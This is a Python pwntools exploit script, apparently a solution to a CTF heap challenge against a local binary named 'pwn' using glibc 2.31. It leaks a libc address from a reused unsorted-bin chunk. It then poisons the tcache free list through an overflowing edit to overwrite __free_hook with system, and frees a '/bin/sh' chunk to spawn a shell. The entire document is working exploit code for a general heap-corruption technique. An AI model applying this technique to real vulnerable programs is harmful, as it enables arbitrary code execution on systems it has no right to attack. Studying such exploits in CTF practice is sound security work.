from pwn import *

elf = ELF("./pwn")
libc = ELF(
    "/home/***/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)
# pause()

# 泄露libc地址
add_chunk(0, 0x410)
add_chunk(1, 0x20)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)

p.recvline()
# tmp = u64(p.recvuntil(b"\x7f").ljust(0x8, b"\x00"))
# print(f"tmp = {hex(tmp)}")
libc.address = u64(p.recvuntil(b"\x7f").ljust(0x8, b"\x00")) - 0x1ECBE0
print(f"libc.address = {hex(libc.address)}")

for i in range(10):
    add_chunk(i, 0x200)

# tcache[0x210] => chunk[6] => chunk[5] => ... => chunk[0]
for i in range(7):
    delete_chunk(i)

# unsorted bin => chunk[8]
delete_chunk(8)
delete_chunk(7)

# tcache[0x20] => chunk[5] => ... => chunk[0]
add_chunk(6, 0x200)
# tcache[0x20] => chunk[8] => chunk[5] => ... => chunk[0]
delete_chunk(8)

add_chunk(7, 0x410)
# tcache[0x20] => chunk[8] => chunk[&__free_hook]
edit_chunk(7, b"a" * 0x200 + p64(0xdeadbeef) + p64(0xaabbccdd) + p64(libc.sym["__free_hook"]))

add_chunk(0, 0x200)
add_chunk(0, 0x200)

# get shell
edit_chunk(0, p64(libc.sym["system"]))
edit_chunk(6, b"/bin/sh\x00")
delete_chunk(6)

p.interactive()
